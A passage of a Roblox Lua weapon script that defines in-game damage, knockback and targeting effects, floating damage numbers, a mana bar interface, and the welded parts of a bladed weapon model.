                h.Health=h.Health-(Damage/2)
                ShowDamage2((hit.Parent:FindFirstChild("Head").CFrame * CFrame.new(0, 0, (Head.Size.Z / 2)).p + Vector3.new(0, 1.5, 0)), -Damage, 1.5, BrickColor.new("Really black").Color)
                end
                if Type=="Knockdown" then
                hum=hit.Parent.Humanoid
hum.PlatformStand=true
coroutine.resume(coroutine.create(function(HHumanoid)
swait(1)
HHumanoid.PlatformStand=false
end),hum)
                local angle=(hit.Position-(Property.Position+Vector3.new(0,0,0))).unit
--hit.CFrame=CFrame.new(hit.Position,Vector3.new(angle.x,hit.Position.y,angle.z))*CFrame.fromEulerAnglesXYZ(math.pi/4,0,0)
local bodvol=Instance.new("BodyVelocity")
bodvol.velocity=angle*knockback
bodvol.P=5000
bodvol.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
bodvol.Parent=hit
rl=Instance.new("BodyAngularVelocity")
rl.P=3000
rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
rl.angularvelocity=Vector3.new(math.random(-10,10),math.random(-10,10),math.random(-10,10))
rl.Parent=hit
game:GetService("Debris"):AddItem(bodvol,.5)
game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Normal" then
                vp=Instance.new("BodyVelocity")
                vp.P=500
                vp.maxForce=Vector3.new(math.huge,0,math.huge)
--                vp.velocity=Character.Torso.CFrame.lookVector*Knockback
                if KnockbackType==1 then
                vp.velocity=Property.CFrame.lookVector*knockback+Property.Velocity/1.05
                elseif KnockbackType==2 then
                vp.velocity=Property.CFrame.lookVector*knockback
                end
                if knockback>0 then
                        vp.Parent=hit.Parent.Torso
                end
                game:GetService("Debris"):AddItem(vp,.5)
                elseif Type=="Up" then
                local bodyVelocity=Instance.new("BodyVelocity")
                bodyVelocity.velocity=vt(0,60,0)
                bodyVelocity.P=5000
                bodyVelocity.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
                bodyVelocity.Parent=hit
                game:GetService("Debris"):AddItem(bodyVelocity,1)
                rl=Instance.new("BodyAngularVelocity")
                rl.P=3000
                rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
                rl.angularvelocity=Vector3.new(math.random(-30,30),math.random(-30,30),math.random(-30,30))
                rl.Parent=hit
                game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Snare" then
                bp=Instance.new("BodyPosition")
                bp.P=2000
                bp.D=100
                bp.maxForce=Vector3.new(math.huge,math.huge,math.huge)
                bp.position=hit.Parent.Torso.Position
                bp.Parent=hit.Parent.Torso
                game:GetService("Debris"):AddItem(bp,1)
                elseif Type=="Target" then
                if Targetting==false then
                ZTarget=hit.Parent.Torso
                coroutine.resume(coroutine.create(function(Part) 
				local hitsounds={"199149137","199149186","199149221","199149235","199149269","199149297"}
				local rndm=math.random(1,#hitsounds)
				local r=rndm
				so("http://www.roblox.com/asset/?id="..hitsounds[r],Part,1,1)
                swait(5)
				so("http://www.roblox.com/asset/?id="..hitsounds[r],Part,1,1)
                end),ZTarget)
                TargHum=ZTarget.Parent:findFirstChild("Humanoid")
                targetgui=Instance.new("BillboardGui")
                targetgui.Parent=ZTarget
                targetgui.Size=UDim2.new(10,100,10,100)
                targ=Instance.new("ImageLabel")
                targ.Parent=targetgui
                targ.BackgroundTransparency=1
                targ.Image="rbxassetid://4834067"
                targ.Size=UDim2.new(1,0,1,0)
                cam.CameraType="Scriptable"
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                Targetting=true
                RocketTarget=ZTarget
                for i=1,Property do
                --while Targetting==true and Humanoid.Health>0 and Character.Parent~=nil do
                if Humanoid.Health>0 and Character.Parent~=nil and TargHum.Health>0 and TargHum.Parent~=nil and Targetting==true then
                swait()
                end
                --workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,Head.CFrame.p+rmdir*100)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)*cf(0,5,10)*euler(-0.3,0,0)
                end
                Targetting=false
                RocketTarget=nil
                targetgui.Parent=nil
                cam.CameraType="Custom"
                end
                end
                        debounce=Instance.new("BoolValue")
                        debounce.Name="DebounceHit"
                        debounce.Parent=hit.Parent
                        debounce.Value=true
                        game:GetService("Debris"):AddItem(debounce,Delay)
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=Player
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                CRIT=false
                hitDeb=true
                AttackPos=6
        end
end
 
showDamage=function(Char,Dealt,du,Color)
        m=Instance.new("Model")
        m.Name=tostring(Dealt)
        h=Instance.new("Humanoid")
        h.Health=0
        h.MaxHealth=0
        h.Parent=m
        c=Instance.new("Part")
        c.Transparency=0
        c.BrickColor=Color
        c.Name="Head"
        c.TopSurface=0
        c.BottomSurface=0
        c.formFactor="Plate"
        c.Size=Vector3.new(1,.4,1)
        ms=Instance.new("CylinderMesh")
        ms.Scale=Vector3.new(.8,.8,.8)
        if CRIT==true then
                ms.Scale=Vector3.new(1,1.25,1)
        end
        ms.Parent=c
        c.Reflectance=0
        Instance.new("BodyGyro").Parent=c
        c.Parent=m
        if Char:findFirstChild("Head")~=nil then
        c.CFrame=CFrame.new(Char["Head"].CFrame.p+Vector3.new(0,1.5,0))
        elseif Char.Parent:findFirstChild("Head")~=nil then
        c.CFrame=CFrame.new(Char.Parent["Head"].CFrame.p+Vector3.new(0,1.5,0))
        end
        f=Instance.new("BodyPosition")
        f.P=2000
        f.D=100
        f.maxForce=Vector3.new(math.huge,math.huge,math.huge)
        f.position=c.Position+Vector3.new(0,3,0)
        f.Parent=c
        game:GetService("Debris"):AddItem(m,.5+du)
        c.CanCollide=false
        m.Parent=workspace
        c.CanCollide=false
end


function ShowDamage2(Pos, Text, Time, Color)
	local Rate = (1 / 30)
	local Pos = (Pos or Vector3.new(0, 0, 0))
	local Text = (Text or "")
	local Time = (Time or 2)
	local Color = (Color or Color3.new(1, 0, 0))
	local EffectPart = part2("Custom",workspace,"SmoothPlastic",0,1,BrickColor.new(Color),"Effect",vt(0,0,0))
	EffectPart.Anchored = true
	local BillboardGui = Instance.new("BillboardGui")
	BillboardGui.Size = UDim2.new(3, 0, 3, 0)
	BillboardGui.Adornee = EffectPart
	local TextLabel = Instance.new("TextLabel")
	TextLabel.BackgroundTransparency = 1
	TextLabel.Size = UDim2.new(1, 0, 1, 0)
	TextLabel.Text = Text
	TextLabel.TextColor3 = Color
	TextLabel.TextScaled = true
	TextLabel.Font = Enum.Font.ArialBold
	TextLabel.Parent = BillboardGui
	BillboardGui.Parent = EffectPart
	game.Debris:AddItem(EffectPart, (Time + 0.1))
	EffectPart.Parent = game:GetService("Workspace")
	Delay(0, function()
		local Frames = (Time / Rate)
		for Frame = 1, Frames do
			wait(Rate)
			local Percent = (Frame / Frames)
			EffectPart.CFrame = CFrame.new(Pos) + Vector3.new(0, Percent, 0)
			TextLabel.TextTransparency = Percent
		end
		if EffectPart and EffectPart.Parent then
			EffectPart:Destroy()
		end
	end)
end

Damagefunc2=function(Part,hit,minim,maxim,knockback,Type,Property,Delay,KnockbackType,decreaseblock)
        if hit.Parent==nil then
                return
        end
        local h=hit.Parent:FindFirstChild("Humanoid")
        for _,v in pairs(hit.Parent:children()) do
        if v:IsA("Humanoid") then
        h=v
        end
        end
        if hit.Parent.Parent:FindFirstChild("Torso")~=nil then
        h=hit.Parent.Parent:FindFirstChild("Humanoid")
        end
        if hit.Parent.className=="Hat" then
        hit=hit.Parent.Parent:findFirstChild("Head")
        end
        if h~=nil and hit.Parent.Name~=Character.Name and hit.Parent:FindFirstChild("Torso")~=nil then
        if hit.Parent:findFirstChild("DebounceHit")~=nil then if hit.Parent.DebounceHit.Value==true then return end end
        --[[                if game.Players:GetPlayerFromCharacter(hit.Parent)~=nil then
                        return
                end]]
--                        hs(hit,1.2) 
                        local c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=game:service("Players").LocalPlayer
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                local Damage=math.random(minim,maxim)
--                h:TakeDamage(Damage)
                local  blocked=false
                local  block=hit.Parent:findFirstChild("Block")
                if block~=nil then
                print(block.className)
                if block.className=="NumberValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock==nil then
                block.Value=block.Value-1
                end
                end
                end
                if block.className=="IntValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock~=nil then
                block.Value=block.Value-1
                end
                end
                end
                end
                if blocked==false then
--                h:TakeDamage(Damage)
                h.Health=h.Health-Damage
                ShowDamage2((Part.CFrame * CFrame.new(0, 0, (Part.Size.Z / 2)).p + Vector3.new(0, 1.5, 0)), -Damage, 1.5, Part.BrickColor.Color)
                else
                h.Health=h.Health-(Damage/2)
                ShowDamage2((Part.CFrame * CFrame.new(0, 0, (Part.Size.Z / 2)).p + Vector3.new(0, 1.5, 0)), -Damage, 1.5, BrickColor.new("Bright blue").Color)
                end
                if Type=="Knockdown" then
                local hum=hit.Parent.Humanoid
hum.PlatformStand=true
coroutine.resume(coroutine.create(function(HHumanoid)
swait(1)
HHumanoid.PlatformStand=false
end),hum)
                local angle=(hit.Position-(Property.Position+Vector3.new(0,0,0))).unit
--hit.CFrame=CFrame.new(hit.Position,Vector3.new(angle.x,hit.Position.y,angle.z))*CFrame.fromEulerAnglesXYZ(math.pi/4,0,0)
local bodvol=Instance.new("BodyVelocity")
bodvol.velocity=angle*knockback
bodvol.P=5000
bodvol.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
bodvol.Parent=hit
local rl=Instance.new("BodyAngularVelocity")
rl.P=3000
rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
rl.angularvelocity=Vector3.new(math.random(-10,10),math.random(-10,10),math.random(-10,10))
rl.Parent=hit
game:GetService("Debris"):AddItem(bodvol,.5)
game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Normal" then
                local vp=Instance.new("BodyVelocity")
                vp.P=500
                vp.maxForce=Vector3.new(math.huge,0,math.huge)
--                vp.velocity=Character.Torso.CFrame.lookVector*Knockback
                if KnockbackType==1 then
                vp.velocity=Property.CFrame.lookVector*knockback+Property.Velocity/1.05
                elseif KnockbackType==2 then
                vp.velocity=Property.CFrame.lookVector*knockback
                end
                if knockback>0 then
                        vp.Parent=hit.Parent.Torso
                end
                game:GetService("Debris"):AddItem(vp,.5)
                elseif Type=="Up" then
                local bodyVelocity=Instance.new("BodyVelocity")
                bodyVelocity.velocity=vt(0,60,0)
                bodyVelocity.P=5000
                bodyVelocity.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
                bodyVelocity.Parent=hit
                game:GetService("Debris"):AddItem(bodyVelocity,1)
                local rl=Instance.new("BodyAngularVelocity")
                rl.P=3000
                rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
                rl.angularvelocity=Vector3.new(math.random(-30,30),math.random(-30,30),math.random(-30,30))
                rl.Parent=hit
                game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Snare" then
                local bp=Instance.new("BodyPosition")
                bp.P=2000
                bp.D=100
                bp.maxForce=Vector3.new(math.huge,math.huge,math.huge)
                bp.position=hit.Parent.Torso.Position
                bp.Parent=hit.Parent.Torso
                game:GetService("Debris"):AddItem(bp,1)
                elseif Type=="Target" then
	            local Targetting = false
                if Targetting==false then
                ZTarget=hit.Parent.Torso
                coroutine.resume(coroutine.create(function(Part) 
                so("http://www.roblox.com/asset/?id=15666462",Part,1,1.5) 
                swait(5)
                so("http://www.roblox.com/asset/?id=15666462",Part,1,1.5) 
                end),ZTarget)
                local TargHum=ZTarget.Parent:findFirstChild("Humanoid")
                local  targetgui=Instance.new("BillboardGui")
                targetgui.Parent=ZTarget
                targetgui.Size=UDim2.new(10,100,10,100)
                local targ=Instance.new("ImageLabel")
                targ.Parent=targetgui
                targ.BackgroundTransparency=1
                targ.Image="rbxassetid://4834067"
                targ.Size=UDim2.new(1,0,1,0)
                cam.CameraType="Scriptable"
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                local dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                Targetting=true
                RocketTarget=ZTarget
                for i=1,Property do
                --while Targetting==true and Humanoid.Health>0 and Character.Parent~=nil do
                if Humanoid.Health>0 and Character.Parent~=nil and TargHum.Health>0 and TargHum.Parent~=nil and Targetting==true then
                swait()
                end
                --workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,Head.CFrame.p+rmdir*100)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)*cf(0,5,10)*euler(-0.3,0,0)
                end
                Targetting=false
                RocketTarget=nil
                targetgui.Parent=nil
                cam.CameraType="Custom"
                end
                end
                        local debounce=Instance.new("BoolValue")
                        debounce.Name="DebounceHit"
                        debounce.Parent=hit.Parent
                        debounce.Value=true
                        game:GetService("Debris"):AddItem(debounce,Delay)
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=Player
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
        end
end

part2 = function(formfactor, parent, material, reflectance, transparency, brickcolor, name, size)
  local fp = it("Part")
  fp.formFactor = formfactor
  fp.Parent = parent
  fp.Reflectance = reflectance
  fp.Transparency = transparency
  fp.CanCollide = false
  fp.Locked = true
  fp.BrickColor = BrickColor.new(tostring(brickcolor))
  fp.Name = name
  fp.Size = size
  fp.Position = Character.Torso.Position
  nooutline(fp)
  fp.Material = material
  fp:BreakJoints()
  return fp
end


local fengui=Instance.new("GuiMain") 
fengui.Parent=Player.PlayerGui 
fengui.Name="WeaponGUI" 
local fenframe=Instance.new("Frame") 
fenframe.Parent=fengui
fenframe.BackgroundColor3=Color3.new(255,255,255) 
fenframe.BackgroundTransparency=1 
fenframe.BorderColor3=Color3.new(17,17,17) 
fenframe.Size=UDim2.new(0.0500000007, 0, 0.100000001, 0)
fenframe.Position=UDim2.new(0.4,0,0.1,0)
local fenbarmana1=Instance.new("TextLabel") 
fenbarmana1.Parent=fenframe 
fenbarmana1.Text=" " 
fenbarmana1.BackgroundTransparency=0 
fenbarmana1.BackgroundColor3=Color3.new(0,0,0) 
fenbarmana1.SizeConstraint="RelativeXY" 
fenbarmana1.TextXAlignment="Center" 
fenbarmana1.TextYAlignment="Center" 
fenbarmana1.Position=UDim2.new(0,0,0,0)
fenbarmana1.Size=UDim2.new(4,0,0.2,0)
local fenbarmana2=Instance.new("TextLabel") 
fenbarmana2.Parent=fenframe 
fenbarmana2.Text=" " 
fenbarmana2.BackgroundTransparency=0 
fenbarmana2.BackgroundColor3=Color3.new(100,100,100)
fenbarmana2.SizeConstraint="RelativeXY" 
fenbarmana2.TextXAlignment="Center" 
fenbarmana2.TextYAlignment="Center" 
fenbarmana2.Position=UDim2.new(0,0,0,0)
fenbarmana2.Size=UDim2.new(4*mana/100,0,0.2,0)
local fenbarmana3=it("TextLabel") 
fenbarmana3.Parent=fenframe 
fenbarmana3.Text=" " 
fenbarmana3.BackgroundTransparency=0 
fenbarmana3.BackgroundColor3=Color3.new(Col1,Col2,Col3)
fenbarmana3.SizeConstraint="RelativeXY" 
fenbarmana3.TextXAlignment="Center" 
fenbarmana3.TextYAlignment="Center" 
fenbarmana3.Position=UDim2.new(0,0,0,0)
fenbarmana3.Size=UDim2.new(0,0,0.2,0)
local fenbarmana4=Instance.new("TextLabel") 
fenbarmana4.Parent=fenframe 
fenbarmana4.Text="Loading interface"
fenbarmana4.BackgroundTransparency=1 
fenbarmana4.BackgroundColor3=Color3.new(0,0,0) 
fenbarmana4.SizeConstraint="RelativeXY" 
fenbarmana4.TextXAlignment="Center" 
fenbarmana4.TextYAlignment="Center" 
fenbarmana4.Position=UDim2.new(0,0,-0.3,0)
fenbarmana4.Size=UDim2.new(4,0,0.2,0)
fenbarmana4.FontSize="Size9"
fenbarmana4.TextStrokeTransparency=0
fenbarmana4.TextColor=BrickColor.new("White")

HandleA=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Medium stone grey","Handle",Vector3.new(1, 1, 1))
HandleAweld=weld(m,Character["Right Arm"],HandleA,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.228433609, 1.0002656, -0.0575428009, -4.32229936e-05, -3.26037371e-05, 0.99999994, 0, 0.999999762, 3.2633543e-05, -0.99999994, 0, -4.32229936e-05))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(3.95000005, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleA,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-2.68768311, -0.0389175415, 0.0997462273, -0.999999881, -0.000124245867, 4.31585941e-05, 4.31585941e-05, -2.1014399e-12, 0.999999881, -0.000124245867, 0.999999762, 3.96104749e-09))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
mesh("SpecialMesh",HandleA,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(1.20000005, 0.25, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.175661087, -0.101444244, 0.00111961365, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Medium stone grey","Part",Vector3.new(1, 1, 2))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.499647141, 1.52587891e-05, 0.00108337402, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.5, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.188549042, 0.108885765, 0.00108909607, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0440139771, 0.0439872742, 0.0011100769, 0.707264364, 0.706946552, 3.26992413e-05, -0.706946671, 0.707264364, -4.24305217e-05, -5.31027217e-05, 6.82158725e-06, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.389144897, -0.104288101, 0.00113677979, 0.965924382, -0.258824557, 4.95198256e-05, 0.258824557, 0.965924382, -4.27193881e-05, -3.67893808e-05, 5.40289911e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Cyan","Part",Vector3.new(0.200000107, 0.200000018, 0.200000033))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.587745667, 1.90734863e-05, 0.00107955933, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.800000012, 0.600000024, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Really black","Part",Vector3.new(4.51999998, 0.300000012, 0.200000048))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.854496, -0.0399444103, 0.000982284546, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.75999999))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.262313843, 0.151351929, 0.00113296509, 0.866146564, 0.499799311, 3.48026697e-05, -0.499799341, 0.866146445, -4.24137761e-05, -5.13857412e-05, 1.93684209e-05, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.68223381, -2.31266022e-05, 0.00113487244, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.280000001, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.10200119, -0.0588569641, 0.00109291077, 0.866146564, 0.499799311, 3.48026697e-05, -0.499799341, 0.866146445, -4.24137761e-05, -5.13857412e-05, 1.93684209e-05, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(0.200000048, 0.300000012, 0.299999952))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.630195618, -0.00102615356, -1.93119049e-05, 0.999999881, 6.32107185e-05, 7.89154292e-05, 7.89154292e-05, 3.9858099e-09, -0.999999881, -6.32107185e-05, 0.999999762, 1.32292555e-09))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.899999976))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(0.200000048, 0.300000012, 0.300000042))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.502216339, -1.6450882e-05, 0.00112724304, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.400000006, 0.200000003, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0538845062, -0.0311193466, 0.0011100769, 0.865986586, -0.500067234, 5.71329329e-05, 0.500067234, 0.865986526, -4.08977285e-05, -2.90437747e-05, 6.40428188e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Dark stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.417726517, 1.28746033e-05, 0.00106811523, 0.999999881, 2.98023224e-08, 4.3159529e-05, -1.86628313e-09, 0.999999821, -4.31849694e-05, -4.31595145e-05, 4.31807348e-05, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Light stone grey","Part",Vector3.new(1, 1, 1))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.582269669, -1.95503235e-05, 0.00113105774, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",Part,Enum.MeshType.Cylinder,"",Vector3.new(0, 0, 0),Vector3.new(0.100000001, 0.300000012, 1))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(0.449999988, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleA,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(4.80104828, -0.0301551819, 0.910226822, 0.984810233, -0.173634201, -3.186717e-05, -5.34346073e-05, -0.000119507618, -0.999999881, 0.173634231, 0.984810054, -0.000127013685))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(0.449999958, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleA,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-4.80100822, -0.0339546204, 0.910426855, -0.984802961, 0.173674881, 4.78334514e-05, 3.63842737e-05, -6.91416062e-05, 0.99999994, 0.173674941, 0.984802961, 6.17822516e-05))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.Neon,0,0,"Institutional white","Wedge",Vector3.new(3.95000005, 0.200000048, 0.200000048))
Wedgeweld=weld(m,HandleA,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.68768311, -0.0297698975, 0.0999078751, 0.999999881, 6.32107185e-05, 7.89154292e-05, 7.89154292e-05, 3.9858099e-09, -0.999999881, -6.32107185e-05, 0.999999762, 1.32292555e-09))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.379999995, 0.5))
HitboxA=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,1,"Really black","HitboxA",Vector3.new(4.65999985, 1.13, 0.200000048))
HitboxAweld=weld(m,HandleA,HitboxA,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.92450333, 0.0550558567, 0.000980377197, 0.999999881, 2.98023224e-08, 0, 2.98023224e-08, 0.999999762, -1.41051937e-09, 0, -1.41051937e-09, 0.999999881))
mesh("SpecialMesh",HitboxA,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.600000024, 0.75999999))



HandleB=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Medium stone grey","Handle",Vector3.new(1, 1, 1))
